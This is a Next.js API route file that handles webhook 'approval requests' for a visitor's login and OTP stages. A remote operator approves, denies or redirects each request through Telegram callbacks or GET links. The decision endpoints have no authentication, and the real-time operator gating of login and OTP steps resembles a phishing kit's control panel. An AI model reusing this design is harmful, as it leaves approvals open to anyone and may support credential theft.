import { NextRequest, NextResponse } from "next/server"
import {
  APPROVAL_WAIT_MS,
  createApprovalRequest,
  getApprovalStatus,
  isApprovalAction,
  resolveApprovalRequest,
  type ApprovalStage,
} from "@/lib/webhook-approvals"

export const dynamic = "force-dynamic"

const VALID_STAGES: ApprovalStage[] = ["login", "otp"]

function normalizeStage(value: unknown): ApprovalStage {
  const stage = String(value ?? "").trim().toLowerCase()
  return (VALID_STAGES as string[]).includes(stage) ? (stage as ApprovalStage) : "login"
}

/** Where a decision link came from: plain webhook call or Telegram callback payload. */
interface DecisionPayload {
  id: string
  action: string | null
}

function extractDecisionFromTelegramCallback(body: unknown): DecisionPayload | null {
  if (!body || typeof body !== "object") return null
  const callback = (body as { callback_query?: { data?: unknown } }).callback_query
  const data = callback && typeof callback.data === "string" ? callback.data : ""
  if (!data) return null
  // Expected callback data format: "<action>:<requestId>"
  const [action, id] = data.split(":")
  if (!id) return null
  return { id, action }
}

async function handleDecision(payload: DecisionPayload): Promise<NextResponse> {
  const id = String(payload.id ?? "").trim()
  const action = String(payload.action ?? "").trim().toLowerCase()

  if (!id || !isApprovalAction(action)) {
    return NextResponse.json(
      { ok: false, error: "A valid request id and action (approve|deny|redirect) are required" },
      { status: 400 },
    )
  }

  const resolved = resolveApprovalRequest(id, action)
  if (!resolved) {
    return NextResponse.json(
      { ok: false, error: "Request not found, already decided, or expired" },
      { status: 404 },
    )
  }

  return NextResponse.json({ ok: true, id: resolved.id, action: resolved.action })
}

/**
 * POST /api/webhook
 *
 * - `{ stage, userId }` creates a new approval request (site side).
 * - `{ id, action }` records an approve / deny / redirect decision (operator side).
 * - A Telegram-style `{ callback_query: { data: "action:id" } }` body is also
 *   accepted so the same universal endpoint can serve a Telegram bot webhook.
 */
export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => null)
    if (!body || typeof body !== "object") {
      return NextResponse.json({ ok: false, error: "JSON body is required" }, { status: 400 })
    }

    // Operator decision (plain or Telegram callback flavor).
    const telegramDecision = extractDecisionFromTelegramCallback(body)
    if (telegramDecision) {
      return handleDecision(telegramDecision)
    }
    if ("id" in body && "action" in body) {
      return handleDecision(body as DecisionPayload)
    }

    // New approval request from the site.
    const userId = String((body as { userId?: unknown }).userId ?? "").trim()
    if (!userId) {
      return NextResponse.json({ ok: false, error: "userId is required" }, { status: 400 })
    }

    const stage = normalizeStage((body as { stage?: unknown }).stage)
    const approval = createApprovalRequest(stage, userId)

    return NextResponse.json({
      ok: true,
      id: approval.id,
      stage: approval.stage,
      status: "pending",
      expiresInMs: APPROVAL_WAIT_MS,
    })
  } catch (error) {
    console.error("Error handling webhook POST:", error)
    return NextResponse.json({ ok: false, error: "Webhook request failed" }, { status: 500 })
  }
}

/**
 * GET /api/webhook?id=<requestId>&action=<approve|deny|redirect>
 *
 * Records a decision from a simple link — handy from any chat client.
 * Returns a small HTML confirmation page.
 */
export async function GET(request: NextRequest) {
  const id = (request.nextUrl.searchParams.get("id") ?? "").trim()
  const action = (request.nextUrl.searchParams.get("action") ?? "").trim().toLowerCase()

  let heading = "Invalid request"
  let detail = "A valid request id and action (approve, deny or redirect) are required."
  let ok = false

  if (id && isApprovalAction(action)) {
    const resolved = resolveApprovalRequest(id, action)
    if (resolved) {
      ok = true
      heading = `Decision recorded: ${action.toUpperCase()}`
      const current = getApprovalStatus(id)
      detail = `The visitor will be handled within ${Math.ceil(
        (current?.remainingMs ?? 0) / 1000,
      )}s. You can close this page.`
    } else {
      heading = "Request unavailable"
      detail = "This request was not found, was already decided, or has expired."
    }
  }

  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>${heading}</title></head><body style="font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f5f5f5"><main style="background:#fff;padding:2rem 2.5rem;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.15);max-width:26rem;text-align:center"><h1 style="font-size:1.25rem;margin:0 0 .75rem;color:${ok ? "#166534" : "#991b1b"}">${heading}</h1><p style="margin:0;color:#374151;font-size:.95rem">${detail}</p></main></body></html>`

  return new NextResponse(html, {
    status: ok ? 200 : 400,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store, no-cache, must-revalidate",
      Pragma: "no-cache",
    },
  })
}
